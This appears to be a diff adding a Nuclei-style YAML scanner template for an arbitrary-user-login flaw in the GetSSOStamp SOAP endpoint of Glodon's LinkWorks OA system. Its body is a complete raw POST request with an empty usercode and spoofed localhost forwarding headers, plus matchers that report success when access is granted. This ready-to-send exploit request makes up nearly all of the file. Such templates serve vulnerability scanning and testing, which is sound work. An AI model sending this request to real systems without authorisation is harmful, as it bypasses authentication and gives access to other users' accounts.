@@ -1,0 +1,50 @@
+id: glodon-linkworks-GetSSOStamp-login
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 广联达OA系统GetSSOStamp接口存在任意用户登录
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BEOA%E7%B3%BB%E7%BB%9FGetSSOStamp%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: acw_tc=0b32973a17225670969561468eed68bb51b36cd0c151b4e3efed761ecd377f
+        x-real-ip: 127.0.0.1
+        x-forwarded-for: 127.0.0.1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
+        sec-ch-ua-mobile: ?0
+        Connection: close
+        SOAPAction: http://tempuri.org/GetStamp
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 277
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:GetStamp>
+                 <!--type: string-->
+                 <tem:usercode></tem:usercode>
+              </tem:GetStamp>
+           </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        negative: true
+        part: body
+        words:
+          - '没有权限访问'
